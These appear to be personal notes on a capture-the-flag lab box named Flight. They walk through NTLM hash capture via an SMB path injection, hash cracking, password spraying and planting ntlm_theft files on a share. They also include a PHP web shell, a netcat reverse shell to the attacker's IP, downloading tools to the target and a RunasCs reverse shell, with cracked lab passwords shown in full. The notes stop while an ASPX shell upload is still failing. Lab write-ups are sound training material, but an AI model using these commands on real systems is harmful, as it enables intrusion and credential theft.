`sudo nmap -sC -sV -oA nmap/flight 10.10.11.187`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[Pasted image 20250113110743.png]]
Add `flight.htb` domain name to `/etc/hosts`

Obtain the hostname for the box by running #crackmapexec 

`cme smb 10.10.11.187`

![[Pasted image 20250113114033.png]]
Add hostname `G0` to` /etc/hosts` as well.

![[Pasted image 20250113114153.png]]
Begin website enumeration.

![[Pasted image 20250113114230.png]]
Clicking around and none of the links work. 

Tried to navigate to `/index.php` but there was no page. 

Start enumerating virtual hosts with #ffuf [[ffuf]]

`ffuf -u http://10.10.11.187 -H "Host: FUZZ. flight.htb" -w /opt/SecLists/Discovery/DNS/subdomains-toplmillion-500.txt`

![[Pasted image 20250113114720.png]]

Run this, cancel it, add filter size flag based on output.

`ffuf -u http://10.10.11.187 -H "Host: FUZZ. flight.htb" -w /opt/SecLists/Discovery/DNS/subdomains-toplmillion-500.txt -fs 7069`

Obtained `school` - adding this to `/etc/hosts`

![[Pasted image 20250113114830.png]]
While this is enumerating.. attempting a #dnszonetransfer as another #subdomainenumeration tactic. [[Sub-Domain Enumeration]] and #dnsenumeration 

`dig @10.10.11.187 axfr flight.htb`

![[Pasted image 20250113115026.png]]
Nothing

Enumerating with #nslookup 

`nslookup`

![[Pasted image 20250113211957.png]]
Nothing

Navigating to `school.flight.htb`

![[Pasted image 20250113212237.png]]
Notice `view` parameter in the URL. 

Poke at this to see if there's any #LFI vulnerabilities or just a file disclosure.

LFI = executes code
File disclosure = just displays contents of the file

![[Pasted image 20250113212401.png]]

Verify this by including an existing file. In this case `index.php`

![[Pasted image 20250113212623.png]]
We can see the php script. 

Copy and paste this php script into a file to read it better. 

Since this is a Windows, try to include a file off a SMB Share and steal the NTLMv2 Hash of the webserver then crack it.

Start #netcat listener

`nc -lvnp 445`

Make a request to server via smb. 

Starting #burpsuite proxy

Go to repeater tab. 

Change `view` parameter 

![[Pasted image 20250113213248.png]]
Result:

![[Pasted image 20250113213325.png]]
Retry request with forward slashes

![[Pasted image 20250113213408.png]]
Response hangs..

Viewing netcat, we can see it's trying to make an smb connection. 

![[Pasted image 20250113213515.png]]

Start #responder to receive and "respond" to smb connection and we'll receive a hash after sending new burp packet.

`sudo python3.8 responder.py -I tun0`

![[Pasted image 20250113213705.png]]
Got the hash! 

Let's crack it with #hashcat 

Save hashes to a file `hashes/flight.ntlmv2`

`./hashcat.bin hashes/flight.ntlmv2 /opt/wordlist/rockyou.txt`

![[Pasted image 20250113213920.png]]
Crack hashes on host, not on the vm. 

Cracked hash: `S@Ss!K@*t13`

![[Pasted image 20250113214102.png]]
Testing these creds with #crackmapexec 

`cme smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'`

![[Pasted image 20250113214331.png]]

Try winrm 

`cme winrm 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'`

![[Pasted image 20250113214425.png]]
Nope. 

Checking smb shares

`cme smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares`

![[Pasted image 20250113214518.png]]

Users and web are non-default = interested in enumerating these more. 

`smbclient -U 'svc_apache' //10.10.11.187/shared`

![[Pasted image 20250114190948.png]]
Users share has stuff
`smbclient -U 'svc_apache' //10.10.11.187/Users`
![[Pasted image 20250114191028.png]]
Also checking out Web share to see if there's a config file. 

`smbclient -U 'svc_apache' //10.10.11.187/Web`

Run `spider_plus` module in crackmapexec to see the files in users.

`cme smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' -M spider_plus --spider users`

![[Pasted image 20250114191705.png]]
This enumerates all the shares. 

Using #jq to view the output and list the files. Nothing interesting though. 

Move to enumerating users on the box with #crackmapexec 

`cme smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users`

![[Pasted image 20250114203225.png]]

Can output this to a `users.txt` file.

Use awk and grep to clean up file. 

Use #crackmapexec to spray usernames.

`cme smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success

Found more valid creds this way for `S.Moon`

![[Pasted image 20250114203734.png]]
Re-enumerating shares with these creds.

`cme smb 10.10.11.187 -u s.moon -p 'S@Ss!K@*t13' --shares

![[Pasted image 20250114203858.png]]
We have read,write access to the "Shared" share. 

Use #smbclient to connect

`smbclient -U s.moon //10.10.11.187/shared`

![[Pasted image 20250114204058.png]]
We want to steal NTLM hashes of users using #ntlm_theft [[NTLM_Theft]]

GitHub: https://github.com/Greenwolf/ntlm_theft

Clone this repo and run it with 

`python3 ntlm_theft.py -g all -s 10.10.14.8 -f PleaseSubscribe`

to generate a bunch of files.

![[Pasted image 20250114204708.png]]

Ensure we have s.moon's smb connection

`smbclient -U s.moon //10.10.11.187/shared`

Set up #responder 

`sudo python3.8 Responder.py -I tun0`

![[Pasted image 20250114204921.png]]

Use `put` command with smbclient to place the theft files on the remote smb share. 

`put PleaseSubscribe.scf`

![[Pasted image 20250114205105.png]]
Got access denied. 

Try `desktop.ini`

![[Pasted image 20250114205156.png]]
This worked. 

We get the NTLM hash. 

![[Pasted image 20250114205305.png]]
Try to crack this hash using #hashcat and the #rockyou wordlist 

`./hashcat.bin hashes/flight.ntlmv2 /opt/wordlist/rockyou.txt`

![[Pasted image 20250114205439.png]]

We see `c.bum`'s password is cracked to `Tikkycoll_431012284`

![[Pasted image 20250114205556.png]]

Using #crackmapexec with these creds to list smb shares again. 

`cme smb 10.10.11.187 -u c.bum -p 'Tikkycoll_431012284' --shares

![[Pasted image 20250114205701.png]]
We have read,write over "Web" share.

![[Pasted image 20250114205846.png]]
Since the web server is running php, we can drop a php reverse shell on the web. 

Using #smbclient 

`smbclient -U c.bum //10.10.11.187/Web`

Create `shell.php`

and add 

`<?php
`system ($_REQUEST['cmd']) ;$`
`php?>`

From smbclient: 

`put shell.php`

Navigate to `/shell.php` from web site

![[Pasted image 20250115201442.png]]

Add `/shell.php?cmd=whoami`

![[Pasted image 20250115201914.png]]
Got RCE. 

Download netcat64 for windows 

https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip

Unzip this locally. Put nc64.exe on remote host.

![[Pasted image 20250115202244.png]]
Start netcat listener on local host

`nc -lvnp 9001`

![[Pasted image 20250115202351.png]]
In the URL, we will execute 

`nc64.exe -e powershell.exe 10.10.14.8 9001`

![[Pasted image 20250115202501.png]]
![[Pasted image 20250115202621.png]]
We got a reverse shell:

![[Pasted image 20250115202719.png]]
Run `whoami /all` to check for SeImpersonatePrivilege because if we do, a potato style attack would work. 

(We don't have it)

![[Pasted image 20250115202825.png]]

Cannot up arrow in this reverse shell. 

![[Pasted image 20250115203013.png]]

Going to kill shell and re-run netcat this way:

`rlwrap nc -lvnp 9001`

![[Pasted image 20250115203112.png]]
Notice in C:\ that there's `inetpub` and that port 8000 is listening from a `netstat -ano` enumeration. 

This means that IIS may be installed

Verifying there may be a web server with 

`curl http://localhost:8000`

![[Pasted image 20250115203512.png]]
`cd inetpub` directory to see if we can write to anything. 

Our current user `svc_apache` doesn't seem to be able to write to anything. 

Run `icacls development` and notice C.Bum can write to this directory

![[Pasted image 20250115203845.png]]

Need to use #RunAsCs tool to switch from `svc_apache` user to `c.bum`

GitHub: https://github.com/antonioCoco/RunasCs

Releases: https://github.com/antonioCoco/RunasCs/releases

Executable: https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

Download the `RunasCs.zip` and unzip locally. Start #pythonhttpserver 

`python3 -m http.server`

`cd /programdata` on reverse shell. 

curl the `RunasCs.exe` file 

`curl http://10.10.14.8:8000/RunasCs.exe -o RunasCs.exe`

![[Pasted image 20250115204607.png]]

Also going to bring nc64.exe here. May not have needed netcat.

`curl http://10.10.14.8:8000/nc64.exe -o nc64.exe`

Try executing #RunAsCs 

`.\runascs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.8:9001 `

We got a powershell window as c.bum!

Going back into `inetpub\development` directory and confirming we have write access. 

![[Pasted image 20250115205430.png]]

We can put an ASPX reverse shell in here on the IIS server.

aspx shells go with iis. 

googling aspx reverse shell.

https://github.com/borjmz/aspx-reverse-shell

paste this into `rev.aspx` file on local host.

Change IP and port # 

![[Pasted image 20250115205808.png]]

Run curl from inetpub directory 

`curl http://10.10.14.8:8000/rev.aspx`
![[Pasted image 20250115205853.png]]
Got hostname is invalid error. 

![[Pasted image 20250115210037.png]]

